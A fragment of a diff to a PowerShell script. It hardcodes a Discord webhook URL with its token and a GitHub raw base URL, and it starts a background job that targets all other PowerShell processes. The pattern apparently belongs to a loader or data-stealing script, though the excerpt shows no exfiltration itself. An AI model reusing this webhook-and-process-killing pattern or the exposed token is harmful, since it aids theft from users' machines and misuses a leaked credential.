@@ -48,7 +48,7 @@ $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
 
 # Instant Ingest: Cleanup moved to background
-Job -ScriptBlock {
+Start-Job -ScriptBlock {
     $current = $args[0]
     Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
         try {
